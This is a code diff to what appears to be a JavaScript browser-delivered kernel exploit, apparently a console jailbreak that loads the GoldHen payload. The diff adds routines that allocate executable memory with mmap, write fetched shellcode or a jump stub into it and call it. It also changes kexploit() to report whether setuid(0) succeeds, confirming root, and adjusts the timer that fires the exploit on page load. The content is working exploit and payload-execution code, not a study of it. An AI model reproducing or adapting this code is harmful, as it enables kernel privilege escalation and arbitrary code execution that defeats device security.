@@ -117,7 +117,36 @@ function array_from_address(addr, size) {
     return og_array;
 }
 
-export function toogle_payload(PLfile) {
+/*function toogle_payload(path) {
+  log(`loading ${path}`);
+  const xhr = new XMLHttpRequest();
+  xhr.open("GET", path);
+  xhr.responseType = "arraybuffer";
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState === 4) {
+      if (xhr.status === 200) {
+          const payload_buffer = chain.sysp("mmap", 0x0, 0x300000, 0x7, 0x41000, 0xffffffff, 0);
+          log(`payload buffer allocated at ${payload_buffer}`);
+          const padding = new Uint8Array(4 - ((xhr.response.byteLength % 4) % 4));
+          const tmp = new Uint8Array(xhr.response.byteLength + padding.byteLength);
+          tmp.set(new Uint8Array(xhr.response), 0);
+          tmp.set(padding, xhr.response.byteLength);
+          const shellcode = new Uint32Array(tmp.buffer);
+          for (let i = 0; i < shellcode.length; i++) {
+            mem.write32(payload_buffer.add(0x100000 + i * 4), shellcode[i]);
+          }
+          log(`loaded ${xhr.response.byteLength} bytes for payload (+ ${padding.length} bytes padding)`);
+          chain.call_void(payload_buffer);
+          sysi("munmap", payload_buffer, 0x300000);
+      }
+    }
+  };
+  localStorage.passcount = ++localStorage.passcount;window.passCounter.innerHTML=localStorage.passcount;
+  EndTimer();
+  xhr.send();
+}*/
+
+function toogle_payload(PLfile) {
  var loader_addr = chain.sysp('mmap', 0, 0x1000, 7, 0x41000, -1, 0);
  var tmpStubArray = array_from_address(loader_addr, 1);
  tmpStubArray[0] = 0x00C3E7FF;
@@ -1736,7 +1765,8 @@ export async function kexploit() {
         if (sysi('setuid', 0) == 0) {
             log("Not running kexploit again.");
             load_exploit_already();
-            return;
+            //return;
+            return true;
         }
     }
     catch (e) {}
@@ -1816,5 +1846,22 @@ export async function kexploit() {
     for (const sd of sds) {
         close(sd);
     }
+  // Check if it all worked
+  try {
+    if (sysi("setuid", 0) == 0) {
+      return true;
+    }
+  } catch {
+    // Still not exploited, something failed, but it made it here...
+  }
+
+  return false;    
+    
 }
-setTimeout(kexploit, 1500);
+setTimeout(kexploit, 1000);  
+/*kexploit().then((success) => {
+  if (success) { 
+        log('load GoldHen succeeded!');
+        Exploit_done();
+  }
+});*/
